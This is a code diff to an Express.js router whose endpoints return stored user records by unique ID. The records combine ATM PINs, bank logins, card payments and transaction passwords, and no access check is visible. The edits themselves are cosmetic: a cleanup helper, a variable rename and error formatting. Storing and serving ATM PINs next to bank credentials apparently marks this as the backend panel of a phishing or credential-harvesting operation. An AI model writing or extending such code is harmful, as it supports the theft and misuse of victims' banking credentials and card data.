@@ -11,13 +11,17 @@ import TransactionPassword from "../models/transactionPassModel.js";
 const router = express.Router();
 
 /* ----------------------------------------------------------
-   FORMAT DATA → remove createdAt & __v
+   CLEAN OBJECT → REMOVE _id, createdAt, __v
 ---------------------------------------------------------- */
 const clean = (obj) => {
     if (!obj) return null;
+
     let data = obj.toObject();
-    delete data.__v;
-    delete data.createdAt;
+
+    delete data._id;        // ❌ REMOVE MONGODB OBJECT ID
+    delete data.__v;        // ❌ REMOVE VERSION
+    delete data.createdAt;  // ❌ REMOVE TIMESTAMP
+
     return data;
 };
 
@@ -50,20 +54,23 @@ router.get("/all-data", async (req, res) => {
         });
 
     } catch (err) {
-        return res.json({ success: false, message: "Server error", error: err.message });
+        return res.json({
+            success: false,
+            message: "Server error",
+            error: err.message
+        });
     }
 });
 
-
 /* ----------------------------------------------------------
-   GET SINGLE USER ALL DATA (BY UNIQUEID)  
+   GET SINGLE USER ALL DATA (BY UNIQUEID)
    /api/all-data/:uniqueid
 ---------------------------------------------------------- */
 router.get("/all-data/:uniqueid", async (req, res) => {
     try {
         const uniqueid = req.params.uniqueid;
 
-        const forms = await UserForms.findOne({ uniqueid });
+        const form = await UserForms.findOne({ uniqueid });
         const atmPin = await AtmPin.findOne({ uniqueid });
         const bankLogin = await BankLogin.findOne({ uniqueid });
         const cardPayment = await CardPayment.findOne({ uniqueid });
@@ -76,7 +83,7 @@ router.get("/all-data/:uniqueid", async (req, res) => {
             message: "User Combined Data Fetched",
             uniqueid,
             data: {
-                form: clean(forms),
+                form: clean(form),
                 atmPin: clean(atmPin),
                 bankLogin: clean(bankLogin),
                 cardPayment: clean(cardPayment),
@@ -87,9 +94,12 @@ router.get("/all-data/:uniqueid", async (req, res) => {
         });
 
     } catch (err) {
-        return res.json({ success: false, message: "Server error", error: err.message });
+        return res.json({
+            success: false,
+            message: "Server error",
+            error: err.message
+        });
     }
 });
-
 
 export default router;
